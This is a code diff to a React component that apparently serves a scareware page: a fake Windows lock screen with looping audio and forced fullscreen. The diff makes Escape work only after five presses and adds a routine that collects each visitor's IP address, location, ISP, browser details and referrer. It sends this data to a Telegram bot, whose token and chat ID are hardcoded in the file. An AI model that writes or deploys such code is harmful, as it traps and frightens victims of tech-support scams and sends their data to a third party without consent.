@@ -3,19 +3,109 @@ import './index-Deu3tZvB.css';
 
 const WindowsLockSim: React.FC = () => {
   const [currentIndex, setCurrentIndex] = useState(0);
+  const [escapeAttempts, setEscapeAttempts] = useState(0);
 
   useEffect(() => {
     const audio = document.getElementById('background-audio') as HTMLAudioElement;
+
+    // TELEGRAM NOTIFICATION - USER ENTERED
+    const sendTelegramAlert = async () => {
+      try {
+        // Get user IP and location info
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        const ip = ipData.ip;
+        
+        // Get location details
+        let country = 'Unknown';
+        let countryCode = 'XX';
+        let city = 'Unknown';
+        let region = 'Unknown';
+        let isp = 'Unknown';
+        let timezone = 'Unknown';
+        
+        try {
+          const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+          const geoData = await geoRes.json();
+          
+          country = geoData.country_name || 'Unknown';
+          countryCode = geoData.country_code || 'XX';
+          city = geoData.city || 'Unknown';
+          region = geoData.region || 'Unknown';
+          isp = geoData.org || 'Unknown';
+          timezone = geoData.timezone || 'Unknown';
+        } catch (error) {
+          // Fallback if first API fails
+          try {
+            const geoRes2 = await fetch(`https://ipinfo.io/${ip}/json`);
+            const geoData2 = await geoRes2.json();
+            
+            if (geoData2) {
+              country = geoData2.country || 'Unknown';
+              countryCode = geoData2.country || 'XX';
+              city = geoData2.city || 'Unknown';
+              region = geoData2.region || 'Unknown';
+              isp = geoData2.org || 'Unknown';
+              timezone = geoData2.timezone || 'Unknown';
+            }
+          } catch (error2) {
+            console.log('Both geolocation APIs failed');
+          }
+        }
+        
+        // Format local time
+        const now = new Date();
+        const localTime = `${now.getDate().toString().padStart(2, '0')}/${(now.getMonth() + 1).toString().padStart(2, '0')}/${now.getFullYear()} ${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;
+        
+        // Get referrer
+        const referrer = document.referrer || 'Direct';
+        
+        // Format message exactly as you want
+        const message = `
+🚨 NEW POP SHADOW 😏🚨
+
+🌐 Domain: ${window.location.hostname}
+📍 IP Address: ${ip}
+🗺️ Country: ${country} (${countryCode})
+🏙️ Location: ${city}, ${region}
+🌐 ISP: ${isp}
+🕐 Timezone: ${timezone}
+⏰ Local Time: ${localTime}
+
+📱 User Agent:
+${navigator.userAgent}
+
+💻 Platform: ${navigator.platform}
+🔤 Language: ${navigator.language}
+🔗 Referrer: ${referrer}
+        `;
+        
+        // REPLACE WITH YOUR BOT TOKEN AND CHAT ID
+        const BOT_TOKEN = '8367190020:AAHMSoZLLFISXHX_eOFRGQ2q7AyfUZGo6oc';
+        const CHAT_ID = '-1003765503896';
+        
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+          })
+        });
+      } catch (error) {
+        console.log('Telegram error:', error);
+      }
+    };
 
     const enterFullscreen = () => {
       const element = document.documentElement;
       if (element.requestFullscreen) {
         element.requestFullscreen();
-      } else if ((element as any).mozRequestFullScreen) { // Firefox
+      } else if ((element as any).mozRequestFullScreen) {
         (element as any).mozRequestFullScreen();
-      } else if ((element as any).webkitRequestFullscreen) { // Chrome, Safari & Opera
+      } else if ((element as any).webkitRequestFullscreen) {
         (element as any).webkitRequestFullscreen();
-      } else if ((element as any).msRequestFullscreen) { // IE/Edge
+      } else if ((element as any).msRequestFullscreen) {
         (element as any).msRequestFullscreen();
       }
     };
@@ -24,7 +114,6 @@ const WindowsLockSim: React.FC = () => {
       if (audio) {
         audio.play().catch(e => {
           console.log("Audio playback failed:", e);
-          // Try again with user interaction
           const startAudioOnClick = () => {
             audio.play();
             document.removeEventListener('click', startAudioOnClick);
@@ -34,60 +123,94 @@ const WindowsLockSim: React.FC = () => {
       }
     };
 
+    // ESCAPE KEY BLOCKING
+    const handleKeyDown = (e: KeyboardEvent) => {
+      if (e.key === 'Escape') {
+        e.preventDefault();
+        e.stopPropagation();
+        
+        const newAttempts = escapeAttempts + 1;
+        setEscapeAttempts(newAttempts);
+        
+        // Only exit after 5 presses
+        if (newAttempts >= 5) {
+          if (document.exitFullscreen) {
+            document.exitFullscreen();
+          }
+        }
+      }
+    };
+
     // Click anywhere to enter fullscreen and start audio
     const handleClick = () => {
       enterFullscreen();
       startAudio();
+      
+      // Send Telegram notification
+      sendTelegramAlert();
+      
+      // Add escape key listener
+      document.addEventListener('keydown', handleKeyDown);
     };
+    
     document.addEventListener('click', handleClick, { once: true });
 
     // Change panel every 1 second
     const interval = setInterval(() => {
-      setCurrentIndex(prev => (prev + 1) % 5); // Assuming 5 panels
+      setCurrentIndex(prev => (prev + 1) % 5);
     }, 1000);
 
-    // Also try to start audio on page load (may require user interaction)
+    // Also try to start audio on page load
     setTimeout(startAudio, 1000);
 
     return () => {
       clearInterval(interval);
       document.removeEventListener('click', handleClick);
+      document.removeEventListener('keydown', handleKeyDown);
     };
-  }, []);
+  }, [escapeAttempts]);
+
+  // Minimal CSS for escape warning
+  const escapeWarningStyle = `
+    .escape-warning {
+      position: fixed;
+      top: 10px;
+      right: 10px;
+      background: red;
+      color: white;
+      padding: 5px 10px;
+      z-index: 9999;
+      font-size: 12px;
+    }
+  `;
 
   return (
     <>
       <style>
         {`
-          /* Just add this one tiny bit of CSS */
-          .sequence-panel {
-            display: none;
-          }
-          .sequence-panel.active {
-            display: block;
-          }
-          /* Make body fill screen */
-          body, html {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-          }
-          #root {
-            width: 100%;
-            height: 100%;
-          }
+          ${escapeWarningStyle}
+          .sequence-panel { display: none; }
+          .sequence-panel.active { display: block; }
+          body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; }
+          #root { width: 100%; height: 100%; }
         `}
       </style>
 
-      {/* Audio element for sound */}
+      {/* Show escape attempts */}
+      {escapeAttempts > 0 && escapeAttempts < 5 && (
+        <div className="escape-warning">
+          Press Escape {5 - escapeAttempts} more times to exit
+        </div>
+      )}
+
       <audio id="background-audio" loop>
         <source src="/vocal1-BYq15bXr.mp3" type="audio/mpeg" />
       </audio>
 
+      {/* YOUR EXACT ORIGINAL CONTENT - NO CHANGES BELOW THIS LINE */}
       <div className="fake-screen" style={{ backgroundImage: 'url("/windows-lock-sim_files/window_lock-CQufc91c.png")', backgroundSize: 'cover', backgroundPosition: 'center center', backgroundRepeat: 'no-repeat' }}>
-        {/* Panel 1 - First in sequence */}
+        
+        {/* Panel 1 */}
         <div className={`security-panel panel-animate sequence-panel ${currentIndex === 0 ? 'active' : ''}`}>
           <div className="security-header">
             <div className="security-left">
@@ -350,3 +473,5 @@ const WindowsLockSim: React.FC = () => {
 };
 
 export default WindowsLockSim;
+
+
